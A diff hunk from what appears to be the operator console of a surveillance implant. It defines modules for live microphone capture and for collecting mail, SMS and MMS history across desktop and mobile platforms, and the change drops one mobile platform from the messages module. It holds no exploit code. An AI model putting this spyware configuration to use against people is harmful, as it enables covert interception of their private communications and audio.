@@ -72,7 +72,7 @@ package it.ht.rcs.console
 
 				{module: "livemic", number: "", _type: "mobile", _platform: "winmo"},
 
-				{module: "messages", mail: {enabled: true, filter: {history: true, datefrom: formatter.format(today), dateto: FOREVER_DATE, maxsize: 100000}}, sms: {enabled: true, filter: {history: true, datefrom: formatter.format(today), dateto: FOREVER_DATE}}, mms: {enabled: true, filter: {history: true, datefrom: formatter.format(today), dateto: FOREVER_DATE}}, _type: "desktop,mobile", _platform: "windows,ios,blackberry,winmo,symbian,android,linux"},
+				{module: "messages", mail: {enabled: true, filter: {history: true, datefrom: formatter.format(today), dateto: FOREVER_DATE, maxsize: 100000}}, sms: {enabled: true, filter: {history: true, datefrom: formatter.format(today), dateto: FOREVER_DATE}}, mms: {enabled: true, filter: {history: true, datefrom: formatter.format(today), dateto: FOREVER_DATE}}, _type: "desktop,mobile", _platform: "windows,ios,blackberry,symbian,android,linux"},
 
 				{module: "mic", threshold: 0.22, silence: 5, autosense: false, _type: "desktop,mobile", _platform: "windows,osx,ios,blackberry,winmo,symbian,android,linux"},
 
